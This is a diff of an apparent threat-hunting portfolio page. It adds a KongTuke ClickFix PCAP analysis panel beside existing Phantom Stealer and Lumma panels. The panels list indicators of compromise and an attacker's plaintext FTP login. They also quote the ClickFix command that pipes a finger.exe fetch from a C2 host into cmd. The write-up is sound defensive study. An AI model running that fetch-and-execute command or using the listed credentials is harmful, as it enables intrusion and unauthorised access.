@@ -177,7 +177,6 @@ footer{position:relative;z-index:1;border-top:1px solid var(--border);padding:36
 @media(max-width:768px){
   .exercises-grid,.tools-grid,.method-grid{grid-template-columns:1fr;}
 
-  /* ── FIX: force all chain panels to single column on mobile ── */
   .chain-panel.active{
     grid-template-columns:1fr !important;
     gap:24px !important;
@@ -205,7 +204,6 @@ footer{position:relative;z-index:1;border-top:1px solid var(--border);padding:36
   section{padding:60px 20px;}
   nav{padding:0 16px;}
 
-  /* Chain tabs scroll on mobile */
   .chain-tabs{overflow-x:auto;-webkit-overflow-scrolling:touch;flex-wrap:nowrap;padding-bottom:4px;}
   .chain-tab{white-space:nowrap;flex-shrink:0;}
 }
@@ -236,8 +234,8 @@ html,body{max-width:100%;overflow-x:hidden;}
     <h1>Hunting<br/><span class="accent">Threats</span><br/><span class="dim">in the Wire.</span></h1>
     <p class="hero-desc">PCAP analysis, malware traffic forensics, and incident response. Documenting real-world attack chains — one packet at a time.</p>
     <div class="hero-stats">
-      <div class="stat-item"><div class="stat-num">4</div><div class="stat-label">EXERCISES</div></div>
-      <div class="stat-item"><div class="stat-num">19</div><div class="stat-label">IOCs FOUND</div></div>
+      <div class="stat-item"><div class="stat-num">5</div><div class="stat-label">EXERCISES</div></div>
+      <div class="stat-item"><div class="stat-num">34</div><div class="stat-label">IOCs FOUND</div></div>
       <div class="stat-item stat-coming-soon">
         <div class="stat-num stat-num-dim">0</div>
         <div class="stat-label">IR REPORTS</div>
@@ -277,7 +275,7 @@ html,body{max-width:100%;overflow-x:hidden;}
       <div class="ex-tags"><span class="tag">NETSUPPORT RAT</span><span class="tag">CMD=POLL</span><span class="tag">CMD=ENCD</span><span class="tag">UNKNOWN VECTOR</span></div>
       <div class="ex-footer"><span class="ex-iocs">Infected: 10.2.28.88 | brolf</span><span class="ex-arrow">→</span></div>
     </a>
-    <a href="#chain" class="exercise-card fade-in" style="transition-delay:0.3s" onclick="switchChain('ex7',document.querySelector('[data-chain=ex7]'))">
+    <a href="#chain" class="exercise-card fade-in" style="transition-delay:0.2s" onclick="switchChain('ex7',document.querySelector('[data-chain=ex7]'))">
       <div class="ex-meta"><span class="ex-date">2026-02-03</span><span class="ex-badge badge-critical">CRITICAL</span></div>
       <div class="ex-title">Phantom in the Drive</div>
       <div class="ex-subtitle">Workgroup Network</div>
@@ -285,13 +283,21 @@ html,body{max-width:100%;overflow-x:hidden;}
       <div class="ex-tags"><span class="tag">PHANTOM STEALER</span><span class="tag">GOOGLE DRIVE</span><span class="tag">FTP EXFIL</span><span class="tag">SANDBOX EVASION</span></div>
       <div class="ex-footer"><span class="ex-iocs">Infected: 10.2.3.101 | tyler</span><span class="ex-arrow">→</span></div>
     </a>
-    <a href="#chain" class="exercise-card fade-in" style="transition-delay:0.2s">
+    <a href="#chain" class="exercise-card fade-in" style="transition-delay:0.3s">
       <div class="ex-meta"><span class="ex-date">2026-01-31</span><span class="ex-badge badge-critical">CRITICAL</span></div>
       <div class="ex-title">Lumma in the Room-ah!</div>
       <div class="ex-subtitle">win11office.com Domain</div>
       <div class="ex-desc">Lumma Stealer delivered via malicious file hub. Multi-stage C2 chain: gate contact, victim fingerprinting, data exfiltration, followed by LSARPC lateral movement attempt against Domain Controller.</div>
       <div class="ex-tags"><span class="tag">LUMMA STEALER</span><span class="tag">C2 GATE</span><span class="tag">FINGERPRINTING</span><span class="tag">LSARPC ATTACK</span></div>
       <div class="ex-footer"><span class="ex-iocs">Infected: 10.1.21.58 | gwyatt</span><span class="ex-arrow">→</span></div>
+    </a>
+    <a href="#chain" class="exercise-card fade-in" style="transition-delay:0.4s" onclick="switchChain('ex8',document.querySelector('[data-chain=ex8]'))">
+      <div class="ex-meta"><span class="ex-date">2026-02-02</span><span class="ex-badge badge-critical">CRITICAL</span></div>
+      <div class="ex-title">KongTuke ClickFix</div>
+      <div class="ex-subtitle">Workgroup Network</div>
+      <div class="ex-desc">Multi-stage attack combining ClickFix social engineering with Drive-by download. KongTuke deployed via DGA domain, LOLBin abuse via finger.exe, then MintsLoader staging chain with victim geo-reconnaissance.</div>
+      <div class="ex-tags"><span class="tag">KONGTUKE</span><span class="tag">CLICKFIX</span><span class="tag">MINTSLOADER</span><span class="tag">LOLBIN</span><span class="tag">DGA</span></div>
+      <div class="ex-footer"><span class="ex-iocs">Infected: 10.2.2.37 | Workgroup</span><span class="ex-arrow">→</span></div>
     </a>
   </div>
 </section>
@@ -317,7 +323,8 @@ html,body{max-width:100%;overflow-x:hidden;}
     <div class="chain-tab" onclick="switchChain('ex5',this)">2026-02-28 — Easy as 123</div>
     <div class="chain-tab" onclick="switchChain('ex6',this)">2026-01-31 — Lumma</div>
     <div class="chain-tab" onclick="switchChain('ex7',this)" data-chain="ex7">2026-02-03 — Phantom</div>
-    <div class="chain-tab chain-tab-soon disabled">Exercise 08 — Coming Soon</div>
+    <div class="chain-tab" onclick="switchChain('ex8',this)" data-chain="ex8">2026-02-02 — KongTuke</div>
+    <div class="chain-tab chain-tab-soon disabled">Exercise 09 — Coming Soon</div>
   </div>
 
   <!-- EX4 PANEL — Big Fish -->
@@ -396,7 +403,7 @@ html,body{max-width:100%;overflow-x:hidden;}
     </div>
   </div>
 
-  <!-- EX5 PANEL — Easy as 123 — NO inline grid styles -->
+  <!-- EX5 PANEL — Easy as 123 -->
   <div class="chain-panel" id="chain-ex5">
     <div class="chain-info fade-in">
       <h3>Easy as 123</h3>
@@ -444,7 +451,7 @@ html,body{max-width:100%;overflow-x:hidden;}
         </g>
         <line x1="160" y1="266" x2="160" y2="298" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar5)"/>
         <text x="308" y="299" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">19:55:51+</text>
-        <g class="chain-node" onmouseenter="showTip(event,'C2 Encoded Commands — CMD=ENCD','Server response: CMD=ENCD\nES=1\nDATA=<encoded payload>\nMeaning: C2 sends encoded commands back\nTotal stream: 62 KB — 264 client packets\nPattern: automated persistent beaconing')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+        <g class="chain-node" onmouseenter="showTip(event,'C2 Encoded Commands — CMD=ENCD','Server response: CMD=ENCD\nES=1\nDATA=&lt;encoded payload&gt;\nMeaning: C2 sends encoded commands back\nTotal stream: 62 KB — 264 client packets\nPattern: automated persistent beaconing')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
           <rect x="10" y="301" width="300" height="66" rx="4" fill="#1a0808" stroke="#ff4757" stroke-width="1.5"/>
           <rect x="10" y="301" width="4" height="66" rx="2" fill="#ff4757"/>
           <text x="24" y="323" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">Persistent C2 — CMD=ENCD</text>
@@ -463,7 +470,7 @@ html,body{max-width:100%;overflow-x:hidden;}
     </div>
   </div>
 
-  <!-- EX6 PANEL — Lumma — NO inline grid styles -->
+  <!-- EX6 PANEL — Lumma -->
   <div class="chain-panel" id="chain-ex6">
     <div class="chain-info fade-in">
       <h3>Lumma in the Room-ah!</h3>
@@ -562,70 +569,46 @@ html,body{max-width:100%;overflow-x:hidden;}
           <marker id="ar7" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M2 2L8 5L2 8" fill="none" stroke="#ff4757" stroke-width="1.5" stroke-linecap="round"/></marker>
           <marker id="aa7" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M2 2L8 5L2 8" fill="none" stroke="#ffa502" stroke-width="1.5" stroke-linecap="round"/></marker>
         </defs>
-
-        <!-- Node 1: Victim -->
         <text x="308" y="8" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">16:13:50</text>
-        <g class="chain-node"
-          onmouseenter="showTip(event,'Victim Workstation','IP: 10.2.3.101\nHostname: DESKTOP-W7F98GR\nUser: tyler\nOS: Windows\nMAC: 00:08:02:1C:47:AE (Hewlett Packard)\nNetwork: Workgroup (no AD/DC)')"
-          onmouseleave="hideTip()" onmousemove="moveTip(event)">
+        <g class="chain-node" onmouseenter="showTip(event,'Victim Workstation','IP: 10.2.3.101\nHostname: DESKTOP-W7F98GR\nUser: tyler\nOS: Windows\nMAC: 00:08:02:1C:47:AE (Hewlett Packard)\nNetwork: Workgroup (no AD/DC)')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
           <rect x="10" y="10" width="300" height="54" rx="4" fill="#151d27" stroke="#253548" stroke-width="1"/>
           <rect x="10" y="10" width="4" height="54" rx="2" fill="#4a5568"/>
           <text x="24" y="32" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">tyler — DESKTOP-W7F98GR</text>
           <text x="24" y="50" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">10.2.3.101 | Workgroup (no domain)</text>
         </g>
-
         <line x1="160" y1="64" x2="160" y2="96" stroke="#ffa502" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#aa7)"/>
         <text x="168" y="84" font-family="'JetBrains Mono',monospace" font-size="9" fill="#ffa502">payload download</text>
-
-        <!-- Node 2: Initial Infection Vector -->
         <text x="308" y="97" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">16:13:50</text>
-        <g class="chain-node"
-          onmouseenter="showTip(event,'Initial Infection Vector','Domain: drive.usercontent.google.com\nIP: 142.251.186.132\nProtocol: HTTPS (TLSv1.2)\nEvidence: Bytes B→A = 270 kB\n= server sent 270 kB to tyler\n= file download confirmed\nNote: Delivery method unknown (outside PCAP)\nGoogle Drive used to bypass firewall whitelisting')"
-          onmouseleave="hideTip()" onmousemove="moveTip(event)">
+        <g class="chain-node" onmouseenter="showTip(event,'Initial Infection Vector','Domain: drive.usercontent.google.com\nIP: 142.251.186.132\nProtocol: HTTPS (TLSv1.2)\nEvidence: Bytes B→A = 270 kB\n= server sent 270 kB to tyler\n= file download confirmed\nNote: Delivery method unknown (outside PCAP)\nGoogle Drive used to bypass firewall whitelisting')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
           <rect x="10" y="99" width="300" height="66" rx="4" fill="#1a1600" stroke="#3d3000" stroke-width="1"/>
           <rect x="10" y="99" width="4" height="66" rx="2" fill="#ffa502"/>
           <text x="24" y="121" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">drive.usercontent.google.com</text>
           <text x="24" y="139" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ffa502">142.251.186.132 — 270 kB payload download</text>
           <text x="24" y="155" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">HTTPS encrypted — Phantom Stealer delivery</text>
         </g>
-
         <line x1="160" y1="165" x2="160" y2="197" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar7)"/>
         <text x="168" y="185" font-family="'JetBrains Mono',monospace" font-size="9" fill="#ff4757">9 sec →</text>
-
-        <!-- Node 3: Reconnaissance -->
         <text x="308" y="198" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">16:13:59</text>
-        <g class="chain-node"
-          onmouseenter="showTip(event,'Sandbox Evasion — Reconnaissance','Domain: ip-api.com\nIP: 208.95.112.1\nProtocol: HTTP (unencrypted)\nRequest: GET /line/?fields=hosting\nPurpose: Check if running in sandbox/datacenter\nResponse: hosting=false = real victim!\nResult: Malware continues execution\nTechnique: T1497 — Virtualization/Sandbox Evasion')"
-          onmouseleave="hideTip()" onmousemove="moveTip(event)">
+        <g class="chain-node" onmouseenter="showTip(event,'Sandbox Evasion — Reconnaissance','Domain: ip-api.com\nIP: 208.95.112.1\nProtocol: HTTP (unencrypted)\nRequest: GET /line/?fields=hosting\nPurpose: Check if running in sandbox/datacenter\nResponse: hosting=false = real victim!\nResult: Malware continues execution\nTechnique: T1497 — Virtualization/Sandbox Evasion')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
           <rect x="10" y="200" width="300" height="66" rx="4" fill="#1a0808" stroke="#3d1010" stroke-width="1"/>
           <rect x="10" y="200" width="4" height="66" rx="2" fill="#ff4757"/>
           <text x="24" y="222" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">ip-api.com — Sandbox Evasion</text>
           <text x="24" y="240" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">GET /line/?fields=hosting → hosting=false</text>
           <text x="24" y="256" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Real victim confirmed → continue attack</text>
         </g>
-
         <line x1="160" y1="266" x2="160" y2="298" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar7)"/>
-
-        <!-- Node 4: Data Collection -->
         <text x="308" y="299" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">16:13:59+</text>
-        <g class="chain-node"
-          onmouseenter="showTip(event,'Data Collection (on device)','Location: Inside tyler device — not visible in PCAP\nData collected:\n- Browser saved passwords → PW_tyler...html\n- Thunderbird contacts → Contacts_Thunderbird.txt\nEvidence: File names visible in FTP STOR commands\nNote: Collection itself not captured in network traffic')"
-          onmouseleave="hideTip()" onmousemove="moveTip(event)">
+        <g class="chain-node" onmouseenter="showTip(event,'Data Collection (on device)','Location: Inside tyler device — not visible in PCAP\nData collected:\n- Browser saved passwords → PW_tyler...html\n- Thunderbird contacts → Contacts_Thunderbird.txt\nEvidence: File names visible in FTP STOR commands\nNote: Collection itself not captured in network traffic')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
           <rect x="10" y="301" width="300" height="66" rx="4" fill="#0a1a0a" stroke="#1a3d1a" stroke-width="1"/>
           <rect x="10" y="301" width="4" height="66" rx="2" fill="#2ed573"/>
           <text x="24" y="323" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">Data Collection — on device</text>
           <text x="24" y="341" font-family="'JetBrains Mono',monospace" font-size="10" fill="#2ed573">Browser passwords + Thunderbird contacts</text>
           <text x="24" y="357" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Not visible in PCAP — inferred from FTP filenames</text>
         </g>
-
         <line x1="160" y1="367" x2="160" y2="399" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar7)"/>
         <text x="168" y="388" font-family="'JetBrains Mono',monospace" font-size="9" fill="#ff4757">2 sec →</text>
-
-        <!-- Node 5: FTP Exfiltration -->
         <text x="308" y="400" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">16:14:01</text>
-        <g class="chain-node"
-          onmouseenter="showTip(event,'FTP Exfiltration','Server: ftp.corwineagles.com\nIP: 162.241.123.75\nProtocol: FTP (port 21) — UNENCRYPTED!\nCredentials visible in plaintext:\n  USER: edunis@corwineagles.com\n  PASS: cCycU=91vup7\nFiles exfiltrated:\n  STOR PW_tyler-DESKTOP-W7F98GR_2026_02_03_16_13_59.html (754 bytes)\n  STOR Contacts_Thunderbird.txt_tyler-... (724 bytes)\nNote: corwineagles.com likely compromised legitimate site')"
-          onmouseleave="hideTip()" onmousemove="moveTip(event)">
+        <g class="chain-node" onmouseenter="showTip(event,'FTP Exfiltration','Server: ftp.corwineagles.com\nIP: 162.241.123.75\nProtocol: FTP (port 21) — UNENCRYPTED!\nCredentials visible in plaintext:\n  USER: edunis@corwineagles.com\n  PASS: cCycU=91vup7\nFiles exfiltrated:\n  STOR PW_tyler-DESKTOP-W7F98GR_2026_02_03_16_13_59.html\n  STOR Contacts_Thunderbird.txt_tyler-...\nNote: corwineagles.com likely compromised legitimate site')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
           <rect x="10" y="402" width="300" height="80" rx="4" fill="#1a0808" stroke="#ff4757" stroke-width="1.5"/>
           <rect x="10" y="402" width="4" height="80" rx="2" fill="#ff4757"/>
           <text x="24" y="424" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">FTP Exfiltration — corwineagles.com</text>
@@ -633,10 +616,7 @@ html,body{max-width:100%;overflow-x:hidden;}
           <text x="24" y="458" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">USER: edunis@corwineagles.com</text>
           <text x="24" y="472" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">162.241.123.75 — likely compromised site</text>
         </g>
-
         <text x="160" y="510" font-family="'JetBrains Mono',monospace" font-size="9" fill="#253548" text-anchor="middle">── ~9 seconds: download → exfiltration ──</text>
-
-        <!-- Legend -->
         <rect x="10" y="524" width="10" height="10" fill="#4a5568" rx="1"/>
         <text x="26" y="533" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568">Victim</text>
         <rect x="80" y="524" width="10" height="10" fill="#ffa502" rx="1"/>
@@ -645,14 +625,136 @@ html,body{max-width:100%;overflow-x:hidden;}
         <text x="186" y="533" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568">On-device</text>
         <rect x="250" y="524" width="10" height="10" fill="#ff4757" rx="1"/>
         <text x="266" y="533" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568">C2/Exfil</text>
-
         <text x="160" y="560" font-family="'JetBrains Mono',monospace" font-size="9" fill="#1e2d3d" text-anchor="middle">Hover each step for full details</text>
       </svg>
     </div>
   </div>
 
+  <!-- EX8 PANEL — KongTuke ClickFix -->
+  <div class="chain-panel" id="chain-ex8">
+    <div class="chain-info fade-in">
+      <h3>KongTuke ClickFix Activity</h3>
+      <p>Multi-stage attack combining ClickFix social engineering with Drive-by download. Victim visited a DGA-generated domain hosting a fake CAPTCHA page. KongTuke deployed automatically, while victim executed a LOLBin (finger.exe) command manually. MintsLoader staged in via obfuscated PowerShell, followed by geo-reconnaissance before GhostWeaver RAT deployment.</p>
+      <div class="chain-meta-grid">
+        <div class="chain-meta-item"><div class="chain-meta-label">INFECTED HOST</div><div class="chain-meta-val">10.2.2.37</div></div>
+        <div class="chain-meta-item"><div class="chain-meta-label">NETWORK</div><div class="chain-meta-val">Workgroup</div></div>
+        <div class="chain-meta-item"><div class="chain-meta-label">MALWARE</div><div class="chain-meta-val">KongTuke / MintsLoader</div></div>
+        <div class="chain-meta-item"><div class="chain-meta-label">C2 STAGE 1</div><div class="chain-meta-val">85.137.253.64</div></div>
+        <div class="chain-meta-item"><div class="chain-meta-label">TECHNIQUE</div><div class="chain-meta-val">ClickFix + LOLBin</div></div>
+        <div class="chain-meta-item"><div class="chain-meta-label">TOTAL TIME</div><div class="chain-meta-val">~2 min</div></div>
+      </div>
+    </div>
+    <div class="chain-svg-wrap fade-in">
+      <svg width="100%" viewBox="0 0 320 680" style="max-height:720px">
+        <defs>
+          <marker id="am8" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M2 2L8 5L2 8" fill="none" stroke="#253548" stroke-width="1.5" stroke-linecap="round"/></marker>
+          <marker id="ar8" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M2 2L8 5L2 8" fill="none" stroke="#ff4757" stroke-width="1.5" stroke-linecap="round"/></marker>
+          <marker id="ao8" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M2 2L8 5L2 8" fill="none" stroke="#ffa502" stroke-width="1.5" stroke-linecap="round"/></marker>
+        </defs>
+
+        <!-- Node 1: Victim -->
+        <text x="308" y="8" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">17:49:22</text>
+        <g class="chain-node" onmouseenter="showTip(event,'Victim Workstation','IP: 10.2.2.37\nOS: Windows\nMAC: 00:18:DE:01:84:C3 (Intel)\nNetwork: Workgroup (no AD/DC)\nNo hostname observed in PCAP')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="10" width="300" height="54" rx="4" fill="#151d27" stroke="#253548" stroke-width="1"/>
+          <rect x="10" y="10" width="4" height="54" rx="2" fill="#4a5568"/>
+          <text x="24" y="32" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">10.2.2.37 — Windows</text>
+          <text x="24" y="50" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Workgroup | MAC: 00:18:DE:01:84:C3</text>
+        </g>
+
+        <line x1="160" y1="64" x2="160" y2="92" stroke="#ffa502" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ao8)"/>
+        <text x="168" y="82" font-family="'JetBrains Mono',monospace" font-size="9" fill="#ffa502">visits ClickFix page</text>
+
+        <!-- Node 2: Initial Infection — ClickFix + Drive-by -->
+        <text x="308" y="95" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">17:49:22</text>
+        <g class="chain-node" onmouseenter="showTip(event,'Initial Infection — ClickFix + Drive-by','Domain: oceanbistrooumc.com\nIP: 35.212.49.138 (Google LLC)\nProtocol: HTTPS (TLSv1.3)\nType: DGA-generated domain\nVT: 4/94 Malicious — tag: DGA\nDomain age: 3 months\nAction 1 (automatic): loads soulversr.com (Drive-by)\nAction 2 (social): shows fake CAPTCHA\n= tricks victim into pasting malicious cmd')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="97" width="300" height="78" rx="4" fill="#1a1600" stroke="#3d3000" stroke-width="1"/>
+          <rect x="10" y="97" width="4" height="78" rx="2" fill="#ffa502"/>
+          <text x="24" y="118" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">oceanbistrooumc.com — ClickFix Page</text>
+          <text x="24" y="136" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ffa502">35.212.49.138 — DGA domain (3 months old)</text>
+          <text x="24" y="152" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Dual action: Drive-by + fake CAPTCHA trick</text>
+          <text x="24" y="166" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">VT: 4/94 malicious | tag: DGA</text>
+        </g>
+
+        <line x1="160" y1="175" x2="160" y2="203" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar8)"/>
+        <text x="168" y="193" font-family="'JetBrains Mono',monospace" font-size="9" fill="#ff4757">auto — 2 sec →</text>
+
+        <!-- Node 3: Drive-by KongTuke -->
+        <text x="308" y="206" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">17:49:22–24</text>
+        <g class="chain-node" onmouseenter="showTip(event,'Drive-by Download — KongTuke','Domain: soulversr.com\nIP: 216.245.184.175\nProtocol: HTTPS (TLSv1.3)\nPayload: ~34 KB (2 connections)\nTiming: 2 seconds — automatic (no user action)\nVT: payload_delivery — KongTuke malware\nNote: Triggered automatically by page JavaScript\nKongTuke = Loader for MintsLoader')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="208" width="300" height="66" rx="4" fill="#1a0808" stroke="#3d1010" stroke-width="1"/>
+          <rect x="10" y="208" width="4" height="66" rx="2" fill="#ff4757"/>
+          <text x="24" y="230" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">soulversr.com — KongTuke Delivery</text>
+          <text x="24" y="248" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">216.245.184.175 — Drive-by (~34 KB)</text>
+          <text x="24" y="264" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">VT: KongTuke payload_delivery confirmed</text>
+        </g>
+
+        <line x1="160" y1="274" x2="160" y2="302" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar8)"/>
+        <text x="168" y="292" font-family="'JetBrains Mono',monospace" font-size="9" fill="#ff4757">42 sec →</text>
+
+        <!-- Node 4: finger.exe LOLBin -->
+        <text x="308" y="305" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">17:50:04</text>
+        <g class="chain-node" onmouseenter="showTip(event,'LOLBin Abuse — finger.exe','IP: 144.31.238.37\nProtocol: FINGER (port 79)\nExecuted by: victim manually (ClickFix trick)\nCommand: copy C:\\WINDOWS\\system32\\finger.exe ...\n  finger captcha@144.31.238.37 | cmd\nTechnique: Living off the Land Binary (LOLBin)\nResult: payload fetched from C2 and piped to cmd\nFileless execution — nothing written to disk')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="307" width="300" height="66" rx="4" fill="#1a0808" stroke="#3d1010" stroke-width="1"/>
+          <rect x="10" y="307" width="4" height="66" rx="2" fill="#ff4757"/>
+          <text x="24" y="329" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">144.31.238.37 — LOLBin finger.exe</text>
+          <text x="24" y="347" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">FINGER protocol — victim ran cmd manually</text>
+          <text x="24" y="363" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Fileless: payload piped directly to cmd</text>
+        </g>
+
+        <line x1="160" y1="373" x2="160" y2="401" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar8)"/>
+
+        <!-- Node 5: C2 Stage 1 -->
+        <text x="308" y="404" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">17:50:04–10</text>
+        <g class="chain-node" onmouseenter="showTip(event,'C2 Stage 1 — PowerShell Stager','IP: 85.137.253.64 (AS215428 — Mykyta Skorobohatko)\nPort: 3456 (non-standard)\nVT: 5/94 Malicious — Werkzeug/Python C2\nStep 1: GET /o → main.ps1 (12 KB)\nStep 2: POST /m → message=ABCD111+Windows Defender\n  → wgr.ps1 (15 KB) returned\nBoth payloads: heavily obfuscated ASCII char arrays\nCommunity: Second stage malware via PS obfuscation')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="406" width="300" height="78" rx="4" fill="#1a0808" stroke="#3d1010" stroke-width="1"/>
+          <rect x="10" y="406" width="4" height="78" rx="2" fill="#ff4757"/>
+          <text x="24" y="427" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">85.137.253.64:3456 — C2 Stage 1</text>
+          <text x="24" y="445" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">GET /o → main.ps1 | POST /m → wgr.ps1</text>
+          <text x="24" y="461" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Obfuscated PowerShell — Werkzeug/Python C2</text>
+          <text x="24" y="477" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Sends: ABCD111 + Windows Defender status</text>
+        </g>
+
+        <line x1="160" y1="484" x2="160" y2="512" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar8)"/>
+
+        <!-- Node 6: MintsLoader Stages -->
+        <text x="308" y="515" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">17:50:11–15</text>
+        <g class="chain-node" onmouseenter="showTip(event,'MintsLoader — Staging Chain','Stage 2: sbwur1.top (64.52.80.153:80)\n  GET /1.php?s=63e95be1... → 52 KB payload\n  Server: QWaWQUF8cyFhydXhS\n  VT: MintsLoader (ThreatFox — netresec)\nStage 3: gecdfcjcbcmmakk.top (64.52.80.153:80)\n  GET /9at1biglx5htr.php?id=DESKTOP-HASYZQ7&key=...\n  Victim registration: hostname + key sent\n  Server receives 298 KB obfuscated payload\n  VT: MintsLoader (ThreatFox — netresec)')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="517" width="300" height="78" rx="4" fill="#1a0808" stroke="#3d1010" stroke-width="1"/>
+          <rect x="10" y="517" width="4" height="78" rx="2" fill="#ff4757"/>
+          <text x="24" y="538" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">MintsLoader — 2-Stage Chain</text>
+          <text x="24" y="556" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">sbwur1.top → 52 KB | gecdfcjcbcmmakk.top → 298 KB</text>
+          <text x="24" y="572" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Victim registration: id=DESKTOP-HASYZQ7</text>
+          <text x="24" y="588" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">ThreatFox: MintsLoader confirmed (netresec)</text>
+        </g>
+
+        <line x1="160" y1="595" x2="160" y2="620" stroke="#ff4757" stroke-width="1" stroke-dasharray="3 3" marker-end="url(#ar8)"/>
+
+        <!-- Node 7: Reconnaissance -->
+        <text x="308" y="623" font-family="'JetBrains Mono',monospace" font-size="9" fill="#4a5568" text-anchor="end">17:50:23+</text>
+        <g class="chain-node" onmouseenter="showTip(event,'Geo-Reconnaissance','api.ipify.org (104.26.12.205) — x2 contacts\n  Purpose: get victim Public IP address\ncheckip.dyndns.org (132.226.8.169)\n  Purpose: alternative IP check\nipinfo.io (34.117.59.81)\n  GET /173.66.46.112/city\n  GET /173.66.46.112/region\n  GET /173.66.46.112/country\n  Purpose: victim geo-location profiling\nNote: all are legitimate services used by malware\nPreparing for GhostWeaver RAT deployment')" onmouseleave="hideTip()" onmousemove="moveTip(event)">
+          <rect x="10" y="625" width="300" height="66" rx="4" fill="#1a0808" stroke="#ff4757" stroke-width="1.5"/>
+          <rect x="10" y="625" width="4" height="66" rx="2" fill="#ff4757"/>
+          <text x="24" y="647" font-family="'JetBrains Mono',monospace" font-size="11" fill="#fff" font-weight="500">Geo-Reconnaissance</text>
+          <text x="24" y="665" font-family="'JetBrains Mono',monospace" font-size="10" fill="#ff4757">api.ipify.org + checkip.dyndns.org + ipinfo.io</text>
+          <text x="24" y="681" font-family="'JetBrains Mono',monospace" font-size="10" fill="#4a5568">Profiling: Public IP + city + region + country</text>
+        </g>
+
+        <!-- Legend -->
+        <rect x="10" y="700" width="10" height="10" fill="#4a5568" rx="1"/>
